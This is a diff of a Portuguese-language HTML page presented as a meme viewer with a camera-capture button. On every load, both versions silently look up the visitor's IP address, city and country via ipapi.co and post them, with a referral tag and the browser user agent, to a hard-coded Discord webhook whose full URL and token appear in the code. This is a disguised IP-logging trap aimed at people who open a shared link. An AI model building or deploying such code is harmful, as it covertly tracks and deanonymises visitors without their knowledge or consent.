@@ -1,142 +1,91 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>Visualizar Meme</title>
   <style>
-    body { font-family: sans-serif; margin: 0; background: #f4f4f4; padding: 20px; }
-    .meme-container { text-align: center; margin-bottom: 20px; }
-    .meme-container img, .meme-container video { max-width: 100%; height: auto; }
-    .info { text-align: center; margin-top: 20px; font-size: 16px; }
-    .photo { margin-top: 20px; text-align: center; }
-    .btn-capture { background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+    body { font-family:sans-serif; text-align:center; padding:20px; background:#f4f4f4; }
+    #memeArea img, #memeArea video { max-width:100%; margin:20px auto; display:block; }
+    .btn-capture { 
+      background:#007bff; color:#fff; border:none; padding:10px 20px; 
+      border-radius:5px; cursor:pointer; font-size:16px; 
+    }
+    #photoPreview { margin-top:20px; max-width:100%; }
   </style>
 </head>
 <body>
-  <h2 style="text-align:center">Meme Visualizado</h2>
-  
-  <div class="meme-container">
-    <img id="memeImage" src="" alt="Meme" style="display:none;">
-    <video id="memeVideo" controls style="display:none;">
-      <source src="" type="video/mp4">
-    </video>
-  </div>
-  
-  <div class="info">
-    <p id="info">Carregando dados...</p>
-  </div>
-
-  <div class="photo" id="photoContainer"></div>
+  <h2>Meme Visualizado</h2>
+  <div id="memeArea">Carregando meme…</div>
+  <button id="captureBtn" class="btn-capture" style="display:none;">🤳 Tirar Foto</button>
+  <div id="photoPreview"></div>
+  <p id="info" style="margin-top:20px; font-size:14px;">Carregando localização…</p>
 
   <script>
-    // Função para exibir o meme com base no parâmetro 'meme' da URL
-    function displayMeme(memeId) {
-      const memeImage = document.getElementById("memeImage");
-      const memeVideo = document.getElementById("memeVideo");
+    // debug
+    const params = new URLSearchParams(window.location.search);
+    console.log("URL params:", window.location.search, Object.fromEntries(params.entries()));
+    const meme = params.get("meme");
+    const ref  = params.get("ref");
 
-      // Verifica o memeID e exibe a imagem ou vídeo correspondente
-      if (memeId === "meme1") {
-        memeImage.src = "https://via.placeholder.com/300x200.png?text=Meme+1";
-        memeImage.style.display = "block";
-        memeVideo.style.display = "none";
-      } else if (memeId === "meme2") {
-        memeVideo.querySelector("source").src = "https://www.w3schools.com/html/mov_bbb.mp4";
-        memeVideo.style.display = "block";
-        memeImage.style.display = "none";
+    // função de exibição
+    function showMeme(id) {
+      const area = document.getElementById("memeArea");
+      if (id === "meme1") {
+        area.innerHTML = '<img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt>';
+      } else if (id === "meme2") {
+        area.innerHTML = '<video controls><source src="https://www.w3schools.com/html/mov_bbb.mp4"></video>';
       } else {
-        document.getElementById("info").innerText = "Meme não encontrado!";
-        return false; // Não exibe nada caso o meme não seja encontrado
+        area.innerText = "Meme não encontrado";
+        return false;
       }
-      return true; // Retorna true caso o meme seja exibido com sucesso
+      return true;
     }
 
-    // Função para pegar data/hora local e dispositivo
-    function getLocalDataAndDevice() {
-      const now = new Date();
-      const dateTime = now.toLocaleString(); // Data e hora local
-      const userAgent = navigator.userAgent; // Informações sobre o dispositivo
-      const info = `Data/Hora Local: ${dateTime}<br>Aparelho: ${userAgent}`;
-      return info;
-    }
-
-    // Função para tirar uma foto usando a câmera
+    // captura de foto via botão
     function capturePhoto() {
-      const video = document.createElement('video');
-      const photoContainer = document.getElementById('photoContainer');
-
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        // Solicita acesso à câmera do usuário
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function(stream) {
-            video.srcObject = stream;
-            video.play();
-            photoContainer.innerHTML = '<p>Captura de foto...</p>';
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            video.onloadeddata = function() {
-              // Quando o vídeo carregar, tira a foto
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-              const img = new Image();
-              img.src = canvas.toDataURL('image/png');
-              photoContainer.innerHTML = ''; // Limpa a área de captura
-              photoContainer.appendChild(img); // Exibe a imagem capturada
-
-              // Para o vídeo e libera o stream
-              stream.getTracks().forEach(track => track.stop());
-            };
-          })
-          .catch(function(error) {
-            photoContainer.innerHTML = '<p>Erro ao acessar a câmera.</p>';
-          });
-      } else {
-        photoContainer.innerHTML = '<p>Seu navegador não suporta acesso à câmera.</p>';
-      }
+      const preview = document.getElementById("photoPreview");
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+          // quando o vídeo está pronto, capturamos um frame
+          video.onloadeddata = () => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            const img = new Image();
+            img.id = "photoPreview";
+            img.src = canvas.toDataURL("image/png");
+            preview.replaceWith(img);
+            stream.getTracks().forEach(t => t.stop());
+          };
+        })
+        .catch(() => preview.innerText = "Permissão de câmera negada.");
     }
 
-    // Função que exibe o meme e ativa o botão para capturar a foto
-    function startCapture(meme) {
-      const memeFound = displayMeme(meme); // Exibe o meme
-      if (memeFound) {
-        // Após o meme ser exibido, adicionar o botão para capturar a foto
-        const photoContainer = document.getElementById("photoContainer");
-        const captureButton = document.createElement("button");
-        captureButton.className = "btn-capture";
-        captureButton.innerText = "Capturar Foto";
-        captureButton.onclick = capturePhoto;
-        photoContainer.appendChild(captureButton);
-      }
-    }
-
-    // Carregar as informações de localização, meme, data/hora, dispositivo e tirar foto
+    // carregar local e enviar Discord
     fetch("https://ipapi.co/json")
-      .then(res => res.json())
+      .then(r => r.json())
       .then(data => {
-        const params = new URLSearchParams(window.location.search);
-        const meme = params.get("meme");
-        const ref = params.get("ref");
-
-        // Exibir as informações de localização e data/hora
-        const locationInfo = `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
-        const deviceInfo = getLocalDataAndDevice();
-
-        document.getElementById("info").innerHTML = locationInfo + "<br><br>" + deviceInfo;
-
-        // Exibir o meme e preparar para capturar a foto
-        startCapture(meme);
-
-        // Enviar dados para o Discord via Webhook
+        document.getElementById("info").innerHTML = 
+          `Meme: ${meme}<br>Ref: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
         fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `**Meme Visualizado:**\nMeme: ${meme}\nReferência: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nData/Hora: ${new Date().toLocaleString()}\nAparelho: ${navigator.userAgent}`
+          method:"POST", headers:{"Content-Type":"application/json"},
+          body: JSON.stringify({ content:
+            `👀 Meme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nAgent: ${navigator.userAgent}` 
           })
         });
       });
+
+    // execução principal
+    if (showMeme(meme)) {
+      const btn = document.getElementById("captureBtn");
+      btn.style.display = "inline-block";
+      btn.onclick = capturePhoto;
+    }
   </script>
 </body>
 </html>
